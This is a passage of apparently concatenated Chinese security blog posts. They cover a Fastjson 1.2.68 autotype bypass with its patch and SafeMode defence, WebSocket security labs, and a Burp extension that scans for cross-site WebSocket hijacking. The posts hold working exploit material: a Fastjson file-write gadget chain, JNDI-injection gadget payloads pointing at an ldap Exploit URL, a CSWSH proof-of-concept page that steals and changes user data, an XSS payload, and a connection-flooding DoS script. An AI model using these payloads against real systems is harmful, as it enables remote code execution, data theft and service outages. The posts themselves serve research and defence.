returns the previous mode value. If the new mode is the same as * the old mode, no action is taken. If the new mode differs from the * old mode, any buffered data is flushed before switching to the new * mode. */ boolean setBlockDataMode(boolean mode) throws IOException &#123; if (blkmode == mode) &#123; return blkmode; &#125; drain(); blkmode = mode; return !blkmode; &#125;... /** * Writes all buffered data from this stream to the underlying stream, * but does not flush underlying stream. */ void drain() throws IOException &#123; if (pos == 0) &#123; return; &#125; if (blkmode) &#123; writeBlockHeader(pos); &#125; out.write(buf, 0, pos); pos = 0; &#125; 对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在： 1234567891011121314public ObjectOutputStream(OutputStream out) throws IOException &#123; verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) &#123; debugInfoStack = new DebugTraceInfoStack(); &#125; else &#123; debugInfoStack = null; &#125;&#125; 但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。 只有有参构造函数的ObjectOutputStream继承类：com.sleepycat.bind.serial.SerialOutput 依赖： 12345&lt;dependency&gt; &lt;groupId&gt;com.sleepycat&lt;/groupId&gt; &lt;artifactId&gt;je&lt;/artifactId&gt; &lt;version&gt;5.0.73&lt;/version&gt;&lt;/dependency&gt; 看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了： 12345678910public SerialOutput(OutputStream out, ClassCatalog classCatalog) throws IOException &#123; super(out); this.classCatalog = classCatalog; /* guarantee that we'll always use the same serialization format */ useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);&#125; PoC如下，用到了Fastjson循环引用的技巧来调用： 123456789101112131415161718192021222324&#123; \"stream\": &#123; \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"targetPath\": \"D:/wamp64/www/hacked.txt\", \"tempPath\": \"D:/wamp64/www/test.txt\" &#125;, \"writer\": &#123; \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.esotericsoftware.kryo.io.Output\", \"buffer\": \"cHduZWQ=\", \"outputStream\": &#123; \"$ref\": \"$.stream\" &#125;, \"position\": 5 &#125;, \"close\": &#123; \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.sleepycat.bind.serial.SerialOutput\", \"out\": &#123; \"$ref\": \"$.writer\" &#125; &#125;&#125; 这里写入文件内容其实有限制，有的特殊字符并不能直接写入到目标文件中，比如写不进PHP代码等。 攻击利用： 补丁分析看GitHub官方的diff，主要在ParserConfig.java中：https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4 对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类： 网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为： 版本 十进制Hash值 十六进制Hash值 类名 1.2.69 5183404141909004468L 0x47ef269aadc650b4L java.lang.Runnable 1.2.69 2980334044947851925L 0x295c4605fd1eaa95L java.lang.Readable 1.2.69 -1368967840069965882L 0xed007300a7b227c6L java.lang.AutoCloseable 这就简单粗暴地防住了这几个类导致的绕过问题了。 SafeMode官方参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode 在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。 代码中设置开启SafeMode如下： 1ParserConfig.getGlobalInstance().setSafeMode(true); 开启之后，就完全禁用AutoType即@type了，这样就能防御住Fastjson反序列化漏洞了。 具体的处理逻辑，是放在checkAutoType()函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行： 0x05 其他一些绕过黑名单的Gadget这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。 1.2.59com.zaxxer.hikari.HikariConfig类PoC： 123&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;或&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125; 1.2.61org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC： 1&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125; 1.2.62org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC： 1&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125; 1.2.68org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC： 123&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;或&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125; com.caucho.config.types.ResourceRef类PoC： 1&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125; 未知版本org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC： 1&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125; org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC： 1&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125; 0x06 参考某json &lt;= 1.2.68 远程代码执行漏洞分析 fastjson 1.2.68 autotype bypass 反序列化漏洞（完整版） Fastjson1.2.6 6 远程代码执行漏洞分析复现含 4 个 Gadget 利用 Poc 构造 https://github.com/threedr3am/learnjavabug","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析WebSocket安全","date":"2021-01-30T07:26:44.000Z","path":"2021/01/30/浅析WebSocket安全/","text":"0x01 WebSocket基础参考之前的文章：CSWSH漏洞总结 0x02 WebSocket安全整体而言，WebSocket安全问题如下： 跨站点WebSocket劫持漏洞 XSS DoS 信息泄露（指使用ws:而非使用wss:进行加密传输） 这里只针对前三种进行说明。 0x03 跨站点WebSocket劫持漏洞跨站点WebSocket劫持漏洞即CSWSH漏洞，具体原理可参考之前的博客：CSWSH漏洞总结 这里在之前的基础上，自己写了个漏洞靶场。 server.js，WebSocket服务端，支持查询用户信息、设置用户名、获取用户名等操作： 1234567891011121314151617181920212223242526272829303132333435363738394041var info = &#123; \"username\": \"admin\", \"phone\": \"13666666666\", \"address\": \"China\"&#125;;var WebSocketServer = require('ws').Server,wss = new WebSocketServer(&#123; port: 8181 &#125;);wss.on('connection', function (ws) &#123; console.log('[*]Client connected!'); ws.on('message', function (message) &#123; if (typeof message == 'string') &#123; console.log(\"[*]Recieve: \" + message); try &#123; var obj = JSON.parse(message); if(typeof obj == 'object' &amp;&amp; obj)&#123; var opt = obj[\"option\"]; if (opt === \"get-info\") &#123; console.log(\"[*]send: \" + JSON.stringify(info)); ws.send(JSON.stringify(info)); &#125; else if (opt === \"set-username\") &#123; info[\"username\"] = obj[\"username\"]; console.log(\"[*]set username: \" + info[\"username\"]); console.log(info[\"username\"]); ws.send(\"Set username successfully.\"); &#125; else if (opt === \"whoami\") &#123; console.log(\"[*]get username: \" + info[\"username\"]); console.log(info[\"username\"]); ws.send(info[\"username\"]); &#125; else &#123; ws.send(\"OK\"); &#125; &#125;else&#123; console.log('[-]Not a JSON type message.'); &#125; &#125; catch(e) &#123; console.log('[-]Error: ' + message + '! ' + e); &#125; &#125; &#125;);&#125;); client.html，WebSocket客户端，用于获取当前用户名： 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;WebSocket Client&lt;/title&gt;&lt;script type=\"text/javascript\"&gt;function getUsername()&#123; if (\"WebSocket\" in window) &#123; var ws = new WebSocket(\"ws://192.168.43.28:8181\"); ws.onopen = function() &#123; ws.send(JSON.stringify(&#123;\"option\":\"whoami\"&#125;)); &#125;; ws.onmessage = function (evt) &#123; var username = evt.data; alert(username); &#125;; &#125; else &#123; alert(\"您的浏览器不支持 WebSocket!\"); &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button onclick=getUsername()&gt;查询用户名&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 运行服务端，然后客户端跨域连接即可查询到用户名： 基于此，编写漏洞利用页面poc.html，结合前面的服务端接口功能，可以实现类似于CSRF攻击手段来篡改用户名、窃取用户敏感信息等： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;WebSocket PoC&lt;/title&gt;&lt;script language=\"javascript\" type=\"text/javascript\"&gt;var wsUri = \"ws://192.168.43.28:8181\";var output;function init()&#123;output = document.getElementById(\"output\");testWebSocket();&#125;function testWebSocket()&#123;websocket = new WebSocket(wsUri);websocket.onopen = function(evt) &#123; onOpen(evt) &#125;;websocket.onclose = function(evt) &#123; onClose(evt) &#125;;websocket.onmessage = function(evt) &#123; onMessage(evt) &#125;;websocket.onerror = function(evt) &#123; onError(evt) &#125;;&#125;function onOpen(evt)&#123;writeToScreen(\"CONNECTED\");//doSend('&#123;\"option\":\"whoami\"&#125;');//doSend('&#123;\"option\":\"get-info\"&#125;');doSend('&#123;\"option\":\"set-username\", \"username\":\"mi1k7ea\"&#125;');&#125;function onClose(evt)&#123;writeToScreen(\"DISCONNECTED\");&#125;function onMessage(evt)&#123;writeToScreen('&lt;span style=\"color: blue;\"&gt;RESPONSE: ' + evt.data+'&lt;/span&gt;');websocket.close();&#125;function onError(evt)&#123;writeToScreen('&lt;span style=\"color: red;\"&gt;ERROR:&lt;/span&gt; ' + evt.data);&#125;function doSend(message)&#123;writeToScreen(\"SENT: \" + message);websocket.send(message);&#125;function writeToScreen(message)&#123;var pre = document.createElement(\"p\");pre.style.wordWrap = \"break-word\";pre.innerHTML = message;output.appendChild(pre);&#125;window.addEventListener(\"load\", init, false);&lt;/script&gt;&lt;h2&gt;WebSocket PoC&lt;/h2&gt;&lt;div id=\"output\"&gt;&lt;/div&gt; 攻击窃取用户敏感信息： 修改用户配置，然后正常用户查询的时候发现内容被修改了： 0x04 XSS很多站点是使用WebSocket来实现在线实时聊天功能的，这其中就可能存在聊天室XSS漏洞。当然，其他应用WebSocket的场景可自行研究是否存在类似的问题。 直接用网上的聊天室Demo改的靶场。 server.js，聊天室WebSocket服务端： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364var WebSocket = require('ws');var WebSocketServer = WebSocket.Server,wss = new WebSocketServer(&#123; port: 8181 &#125;);var uuid = require('node-uuid');var clients = [];function wsSend(type, client_uuid, nickname, message) &#123; for (var i = 0; i &lt; clients.length; i++) &#123; var clientSocket = clients[i].ws; if (clientSocket.readyState === WebSocket.OPEN) &#123; clientSocket.send(JSON.stringify(&#123; \"type\": type, \"id\": client_uuid, \"nickname\": nickname, \"message\": message &#125;)); &#125; &#125;&#125;var clientIndex = 1;wss.on('connection', function(ws) &#123; var client_uuid = uuid.v4(); var nickname = \"AnonymousUser\" + clientIndex; clientIndex += 1; clients.push(&#123; \"id\": client_uuid, \"ws\": ws, \"nickname\": nickname &#125;); console.log('client [%s] connected', client_uuid); var connect_message = nickname + \" has connected\"; wsSend(\"notification\", client_uuid, nickname, connect_message); console.log('client [%s] connected', client_uuid); ws.on('message', function(message) &#123; if (message.indexOf('/nick') === 0) &#123; var nickname_array = message.split(' '); if (nickname_array.length &gt;= 2) &#123; var old_nickname = nickname; nickname = nickname_array[1]; var nickname_message = \"Client \" + old_nickname + \" changed to \" + nickname; wsSend(\"nick_update\", client_uuid, nickname, nickname_message); &#125; &#125; else &#123; wsSend(\"message\", client_uuid, nickname, message); &#125; &#125;); var closeSocket = function(customMessage) &#123; for (var i = 0; i &lt; clients.length; i++) &#123; if (clients[i].id == client_uuid) &#123; var disconnect_message; if (customMessage) &#123; disconnect_message = customMessage; &#125; else &#123; disconnect_message = nickname + \" has disconnected\"; &#125; wsSend(\"notification\", client_uuid, nickname, disconnect_message); clients.splice(i, 1); &#125; &#125; &#125;; ws.on('close', function () &#123; closeSocket(); &#125;); process.on('SIGINT', function () &#123; console.log(\"Closing things\"); closeSocket('Server has disconnected'); process.exit(); &#125;);&#125;); client.html，聊天室WebSocket客户端，： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;WebSocket Echo Demo&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/&gt; &lt;link href=\"../bootstrap-3.3.5/css/bootstrap.min.css\" rel=\"stylesheet\" /&gt; &lt;script src=\"../js/jquery-1.12.3.min.js\"&gt;&lt;/script&gt; &lt;script src=\"../js/jquery-1.12.3.min.js\"&gt;&lt;/script&gt; &lt;script src=\"../bootstrap-3.3.5/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;script&gt; //建立连接 var ws = new WebSocket(\"ws://192.168.43.28:8181\"); var nickname = \"\"; ws.onopen = function (e) &#123; console.log('Connection to server opened'); &#125; //显示 function appendLog(type, nickname, message) &#123; if (typeof message == \"undefined\") return; var messages = document.getElementById('messages'); var messageElem = document.createElement(\"li\"); var preface_label; if (type === 'notification') &#123; preface_label = \"&lt;span class=\\\"label label-info\\\"&gt;*&lt;/span&gt;\"; &#125; else if (type == 'nick_update') &#123; preface_label = \"&lt;span class=\\\"label label-warning\\\"&gt;*&lt;/span&gt;\"; &#125; else &#123; preface_label = \"&lt;span class=\\\"label label-success\\\"&gt;\" + nickname + \"&lt;/span&gt;\"; &#125; var message_text = \"&lt;h2&gt;\" + preface_label + \"&amp;nbsp;&amp;nbsp;\" + message + \"&lt;/h2&gt;\"; messageElem.innerHTML = message_text; messages.appendChild(messageElem); &#125; //收到消息处理 ws.onmessage = function (e) &#123; var data = JSON.parse(e.data); nickname = data.nickname; appendLog(data.type, data.nickname, data.message); console.log(\"ID: [%s] = %s\", data.id, data.message); &#125; ws.onclose = function (e) &#123; appendLog(\"Connection closed\"); console.log(\"Connection closed\"); &#125; //发送消息 function sendMessage() &#123; var messageField = document.getElementById('message'); if (ws.readyState === WebSocket.OPEN) &#123; ws.send(messageField.value); &#125; messageField.value = ''; messageField.focus(); &#125; //修改名称 function changName() &#123; var name = $(\"#name\").val(); if (ws.readyState === WebSocket.OPEN) &#123; ws.send(\"/nick \" + name); &#125; &#125; function disconnect() &#123; ws.close(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body &gt; &lt;div class=\"vertical-center\"&gt; &lt;div class=\"container\"&gt; &lt;ul id=\"messages\" class=\"list-unstyled\"&gt;&lt;/ul&gt; &lt;hr/&gt; &lt;form role=\"form\" id=\"chat_form\" onsubmit=\"sendMessage(); return false;\"&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" type=\"text\" id=\"message\" name=\"message\" placeholder=\"Type text to echo in here\" value=\"\" autofocus/&gt; &lt;/div&gt; &lt;button type=\"button\" id=\"send\" class=\"btn btn-primary\" onclick=\"sendMessage();\"&gt; Send Message &lt;/button&gt; &lt;/form&gt; &lt;div class=\"form-group\"&gt;&lt;span&gt;nikename：&lt;/span&gt;&lt;input id=\"name\" type=\"text\" /&gt; &lt;button class=\"btn btn-sm btn-info\" onclick=\"changName();\"&gt;change&lt;/button&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 正常的聊天室交流使用： 漏洞利用页面poc.html： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!DOCTYPE html&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;WebSocket PoC&lt;/title&gt;&lt;script language=\"javascript\" type=\"text/javascript\"&gt;var wsUri = \"ws://192.168.43.28:8181\";var output;function init()&#123;output = document.getElementById(\"output\");testWebSocket();&#125;function testWebSocket()&#123;websocket = new WebSocket(wsUri);websocket.onopen = function(evt) &#123; onOpen(evt) &#125;;websocket.onclose = function(evt) &#123; onClose(evt) &#125;;websocket.onmessage = function(evt) &#123; onMessage(evt) &#125;;websocket.onerror = function(evt) &#123; onError(evt) &#125;;&#125;function onOpen(evt)&#123;writeToScreen(\"CONNECTED\");doSend('&lt;img src=x onerror=alert(document.domain)&gt;');&#125;function onClose(evt)&#123;writeToScreen(\"DISCONNECTED\");&#125;function onMessage(evt)&#123;writeToScreen('&lt;span style=\"color: blue;\"&gt;RESPONSE: ' + evt.data+'&lt;/span&gt;');websocket.close();&#125;function onError(evt)&#123;writeToScreen('&lt;span style=\"color: red;\"&gt;ERROR:&lt;/span&gt; ' + evt.data);&#125;function doSend(message)&#123;writeToScreen(\"SENT: \" + message);websocket.send(message);&#125;function writeToScreen(message)&#123;var pre = document.createElement(\"p\");pre.style.wordWrap = \"break-word\";pre.innerHTML = message;output.appendChild(pre);&#125;window.addEventListener(\"load\", init, false);&lt;/script&gt;&lt;h2&gt;WebSocket PoC&lt;/h2&gt;&lt;div id=\"output\"&gt;&lt;/div&gt; 用户被诱导访问后，将造成聊天室存储型XSS攻击： 0x05 DoSWebSocket服务端的连接如果并未限制连接数，可能会导致DoS风险。 看个自己写的简单的靶场。 server.js，WebSocket服务端，很简单，直接连接并接受消息，但未限制连接数： 12345678var WebSocketServer = require('ws').Server,wss = new WebSocketServer(&#123; port: 8181 &#125;);wss.on('connection', function (ws) &#123; console.log('[*]Client connected!'); ws.on('message', function (message) &#123; console.log(message); &#125;);&#125;); client.html，WebSocket客户端，建立WebSocket连接并发送消息： 1234567891011121314151617181920212223242526272829303132333435363738&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;WebSocket Echo Demo&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/&gt; &lt;link href=\"../bootstrap-3.3.5/css/bootstrap.min.css\" rel=\"stylesheet\" /&gt; &lt;script src=\"../js/jquery-1.12.3.min.js\"&gt;&lt;/script&gt; &lt;script src=\"../js/jquery-1.12.3.min.js\"&gt;&lt;/script&gt; &lt;script src=\"../bootstrap-3.3.5/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;script&gt; var ws = new WebSocket(\"ws://192.168.43.28:8181\"); ws.onopen = function (e) &#123; console.log('Connection to server opened'); &#125; function sendMessage() &#123; ws.send($('#message').val()); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body &gt; &lt;div class=\"vertical-center\"&gt; &lt;div class=\"container\"&gt; &lt;p&gt;&amp;nbsp;&lt;/p&gt; &lt;form role=\"form\" id=\"chat_form\" onsubmit=\"sendMessage(); return false;\"&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" type=\"text\" name=\"message\" id=\"message\" placeholder=\"Type text to echo in here\" value=\"\" /&gt; &lt;/div&gt; &lt;button type=\"button\" id=\"send\" class=\"btn btn-primary\" onclick=\"sendMessage();\"&gt; Send! &lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 正常使用很简单，就是和WebSocket服务端建立连接并发送消息： 编写利用poc，就是使用Python的三方库ws4py实现循环建立WebSocket连接进行DoS攻击： 123456789101112131415161718192021222324252627import jsonfrom ws4py.client.threadedclient import WebSocketClient class CG_Client(WebSocketClient): def opened(self): req = 'mi1k7ea' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) data = resp['data'] if type(data) is dict: ask = data['asks'][0] print('Ask:', ask) bid = data['bids'][0] print('Bid:', bid) if __name__ == '__main__': while 1: ws = CG_Client('ws://192.168.43.28:8181') ws.connect() 攻击效果：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"WebSocket","slug":"WebSocket","permalink":"https://www.mi1k7ea.com/tags/WebSocket/"}]},{"title":"BurpExtender开发之跨站点WebSocket劫持漏洞扫描器","date":"2021-01-30T06:56:48.000Z","path":"2021/01/30/BurpExtender开发之跨站点WebSocket劫持漏洞扫描器/","text":"直接看代码吧，BurpExtender.java： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257package burp;import javax.swing.*;import javax.swing.table.AbstractTableModel;import javax.swing.table.TableModel;import java.awt.*;import java.io.PrintWriter;import java.net.URL;import java.util.*;import java.util.List;import java.util.concurrent.atomic.AtomicBoolean;public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IHttpListener&#123; private IBurpExtenderCallbacks callbacks; private IExtensionHelpers helpers; private JSplitPane splitPane; private IMessageEditor requestViewer; private IMessageEditor scanViewer; private IMessageEditor responseViewer; private List&lt;VulEntry&gt; vul_list = new ArrayList&lt;VulEntry&gt;(); private IHttpRequestResponse currentlyDisplayedItem; public PrintWriter stdout; final String WebSocket_Word = \"Upgrade: websocket\"; final String Evil_Domain = \"http://evil.com\"; @Override public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)&#123; this.callbacks = callbacks; this.stdout = new PrintWriter(callbacks.getStdout(), true); this.helpers = callbacks.getHelpers(); this.stdout.println(\"Author: Mi1k7ea\"); callbacks.setExtensionName(\"CrossSite WebSocket Hijacking Vul Scan\"); callbacks.registerScannerCheck(this); // create our UI SwingUtilities.invokeLater(new Runnable() &#123; @Override public void run() &#123; // main split pane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT); // table of vul entries Table vulTable = new Table(BurpExtender.this); JScrollPane scrollPane = new JScrollPane(vulTable); splitPane.setLeftComponent(scrollPane); // tabs with request/response viewers JTabbedPane tabs = new JTabbedPane(); requestViewer = callbacks.createMessageEditor(BurpExtender.this, false); scanViewer = callbacks.createMessageEditor(BurpExtender.this, false); responseViewer = callbacks.createMessageEditor(BurpExtender.this, false); tabs.addTab(\"Origin Request\", requestViewer.getComponent()); tabs.addTab(\"Fuzzing Request\", scanViewer.getComponent()); tabs.addTab(\"Response\", responseViewer.getComponent()); splitPane.setRightComponent(tabs); // customize our UI components callbacks.customizeUiComponent(splitPane); callbacks.customizeUiComponent(vulTable); callbacks.customizeUiComponent(scrollPane); callbacks.customizeUiComponent(tabs); // add the custom tab to Burp's UI callbacks.addSuiteTab(BurpExtender.this); // register ourselves as an HTTP listener callbacks.registerHttpListener(BurpExtender.this); &#125; &#125;); &#125; @Override public List&lt;IScanIssue&gt; doPassiveScan( IHttpRequestResponse baseRequestResponse) &#123; this.stdout.println(\"[*]Passive Scan: \" + baseRequestResponse.getHttpService()); // 获取请求方法 String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod(); // 提取请求参数 List&lt;IParameter&gt; baseParams = this.helpers.analyzeRequest(baseRequestResponse.getRequest()).getParameters(); StringBuilder sb = new StringBuilder(); baseParams.forEach(p -&gt; &#123; if (sb.length() &gt; 0) &#123; sb.append(\"&amp;\" + p.getName() + \"=\" + p.getValue()); &#125; else &#123; sb.append(p.getName() + \"=\" + p.getValue()); &#125; &#125;); String baseRequestParams = sb.toString();// scanCORS(baseRequestResponse, method, baseRequestParams); scanWebSocket(baseRequestResponse); return null; &#125; @Override public List&lt;IScanIssue&gt; doActiveScan( IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) &#123; // TODO here return null; &#125; @Override public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) &#123; // TODO here return 0; &#125; @Override public String getTabCaption() &#123; return \"跨站点WebSocket劫持漏洞扫描器\"; &#125; @Override public Component getUiComponent() &#123; return this.splitPane; &#125; @Override public IHttpService getHttpService() &#123; return this.currentlyDisplayedItem.getHttpService(); &#125; @Override public byte[] getRequest() &#123; return this.currentlyDisplayedItem.getRequest(); &#125; @Override public byte[] getResponse() &#123; return this.currentlyDisplayedItem.getResponse(); &#125; @Override public int getRowCount() &#123; return vul_list.size(); &#125; @Override public int getColumnCount() &#123; return 2; &#125; @Override public String getColumnName(int columnIndex) &#123; switch (columnIndex) &#123; case 0: return \"Name\"; case 1: return \"URL\"; default: return \"\"; &#125; &#125; @Override public Class&lt;?&gt; getColumnClass(int columnIndex) &#123; return String.class; &#125; @Override public Object getValueAt(int rowIndex, int columnIndex) &#123; VulEntry vulEntry = vul_list.get(rowIndex); switch (columnIndex) &#123; case 0: return vulEntry.vul_name; case 1: return vulEntry.url.toString(); default: return \"\"; &#125; &#125; @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123; &#125; // extend JTable to handle cell selection private class Table extends JTable &#123; public Table(TableModel tableModel) &#123; super(tableModel); &#125; @Override public void changeSelection(int row, int col, boolean toggle, boolean extend) &#123; VulEntry vulEntry = vul_list.get(row); requestViewer.setMessage(vulEntry.baseRequestResponse.getRequest(), true); scanViewer.setMessage(vulEntry.fuzzingRequestResponse.getRequest(), true); responseViewer.setMessage(vulEntry.fuzzingRequestResponse.getResponse(), false); currentlyDisplayedItem = vulEntry.fuzzingRequestResponse; super.changeSelection(row, col, toggle, extend); &#125; &#125; private static class VulEntry &#123; String vul_name; IHttpRequestResponsePersisted baseRequestResponse; IHttpRequestResponsePersisted fuzzingRequestResponse; URL url; public VulEntry(String vul_name, IHttpRequestResponsePersisted baseRequestResponse, IHttpRequestResponsePersisted fuzzingRequestResponse, URL url) &#123; this.vul_name = vul_name; this.baseRequestResponse = baseRequestResponse; this.fuzzingRequestResponse = fuzzingRequestResponse; this.url = url; &#125; &#125; void scanWebSocket(IHttpRequestResponse baseRequestResponse) &#123; IResponseInfo responseInfo = this.helpers.analyzeResponse(baseRequestResponse.getResponse()); if (responseInfo.getStatusCode() == 101 &amp;&amp; responseInfo.getHeaders().contains(this.WebSocket_Word) &amp;&amp; this.helpers.analyzeRequest(baseRequestResponse).getHeaders().contains(this.WebSocket_Word)) &#123; // 替换Origin头为恶意域名 List&lt;String&gt; fuzzing_headers = this.helpers.analyzeRequest(baseRequestResponse).getHeaders(); fuzzing_headers.forEach(header -&gt; &#123; if (header.toLowerCase().startsWith(\"origin:\")) &#123; Collections.replaceAll(fuzzing_headers, header, \"Origin: \" + this.Evil_Domain); &#125; &#125;); byte[] fuzzingBody = this.helpers.buildHttpMessage(fuzzing_headers, null); IHttpRequestResponse fuzzingRequestResponse = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), fuzzingBody); if (this.helpers.analyzeResponse(fuzzingRequestResponse.getResponse()).getStatusCode() == 101 &amp;&amp; this.helpers.analyzeResponse(fuzzingRequestResponse.getResponse()).getHeaders().contains(this.WebSocket_Word)) &#123; this.stdout.println(\"[!]存在跨站点WebSocket劫持漏洞!\"); int row = this.vul_list.size(); this.vul_list.add( new VulEntry( \"跨站点WebSocket劫持漏洞\", this.callbacks.saveBuffersToTempFiles(baseRequestResponse), this.callbacks.saveBuffersToTempFiles(fuzzingRequestResponse), this.helpers.analyzeRequest(fuzzingRequestResponse).getUrl() ) ); fireTableRowsInserted(row, row); &#125; &#125; &#125;&#125; 